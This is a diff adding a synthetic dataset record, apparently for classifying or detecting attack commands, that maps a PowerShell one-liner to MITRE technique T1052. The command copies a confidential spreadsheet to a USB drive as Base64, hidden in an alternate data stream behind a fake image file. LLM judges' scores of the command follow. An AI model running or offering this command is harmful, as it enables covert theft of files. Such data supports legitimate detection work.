@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); New-Item -Path \"$dl:\\Pictures\\wallpaper.jpg\" -ItemType File -Force | Out-Null; $b=[IO.File]::ReadAllBytes(\"C:\\Users\\Public\\Documents\\confidential.xlsx\"); $b64=[Convert]::ToBase64String($b); Set-Content -Path \"$dl:\\Pictures\\wallpaper.jpg\" -Stream \"thumbs\" -Value $b64",
+  "explanation": "Encodes a sensitive file as Base64 and stores it in an alternate data stream on a benign-looking file on the USB to reduce detection while exfiltrating via removable media.",
+  "rationale_steps": [
+    "Resolve the USB drive letter and ensure a cover file exists.",
+    "Read the target file and convert its bytes to Base64.",
+    "Write the encoded data into an ADS on the USB file."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-d23851d8",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced quotes/parentheses, proper separators, and valid parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "It identifies a removable drive, creates a benign file, Base64-encodes the target data, and hides it in an ADS for exfiltration, but may fail if the Pictures folder doesn't exist or the USB is not NTFS.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T10:33:44.821368Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed PowerShell with balanced quotes, valid semicolons as separators, and correct cmdlet syntax, though the use of `-Stream` parameter with `Set-Content` for alternate data streams on FAT32-formatted USB drives (which don't support NTFS ADS) is a functional concern rather than a syntax error.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements T1052 by detecting a removable drive, reading a sensitive file, Base64-encoding it, and hiding it in an alternate data stream of a benign-looking image file on the USB — a realistic steganographic exfiltration approach — though the technique's effectiveness is limited since most USB drives use FAT32 which does not support NTFS alternate data streams, reducing operational plausibility.",
+        "combined_score": 4.0,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:42:29.193736Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct PowerShell syntax, properly balanced parentheses, and valid .NET class calls separated by semicolons.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively demonstrates the technique, though it assumes the target USB is formatted with NTFS to support Alternate Data Streams and that a 'Pictures' directory already exists.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:42:31.649788Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
